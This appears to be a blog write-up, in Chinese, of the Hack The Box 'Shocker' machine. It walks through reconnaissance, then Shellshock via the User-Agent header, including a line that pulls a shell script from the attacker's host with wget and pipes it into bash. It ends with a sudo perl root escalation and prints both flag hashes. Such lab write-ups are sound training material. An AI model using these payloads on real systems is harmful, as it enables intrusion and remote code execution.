---
title: Shocker (Hack The Box Writeup)
date: 2021-09-15T14:06:00+08:00
draft: false
url: "/2021/09/15/shocker-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- IP : 10.129.213.104
- URL : https://app.hackthebox.eu/machines/108

## Recon

- Rustscan![](/uploads/2022/02/95872-4BeuvZQ.png)nmap- ![](/uploads/2022/02/2d8e8-zj7S9gt.png)觀察首頁- ![](/uploads/2022/02/855c5-VW19KRW.png)通靈掃到目錄 `/cgi-bin/user.sh`- ![](/uploads/2022/02/37ca6-iniIUSg.png)

## Shell shock

- 在 User agent 增加`() { :;}; echo; /usr/bin/id`
- ![](/uploads/2022/02/3708b-2iOQw9q.png)`User-Agent: () { :;}; echo; /usr/bin/wget 10.10.16.35:8000/s_HTB /tmp/s`- 下載 shell
- ![](/uploads/2022/02/b312a-5A2lKtC.png)執行 shell- `User-Agent: () { :;}; echo; /usr/bin/wget -O - 10.10.16.35:8000/s_HTB | /bin/bash`

## Reverse shell

- 收 shell![](/uploads/2022/02/4e7d4-Utt4lst.png)Spawn shell- `python3 -c 'import pty; pty.spawn("/bin/bash")'`Get user flag- ![](/uploads/2022/02/ad2c5-M4rjd5b.png)
- `6e9aad0e2498bff702b570c2da380288`

## 提權

- 跑豌豆![](/uploads/2022/02/6bdc2-Gfbiuav.png)可以執行 perl- `sudo perl -e 'exec "/bin/sh";'`取得 Root Flag- ![](/uploads/2022/02/a3804-bFTiyzW.png)
- `e3e05cbd925c9e407215bb26e9b7e47d`
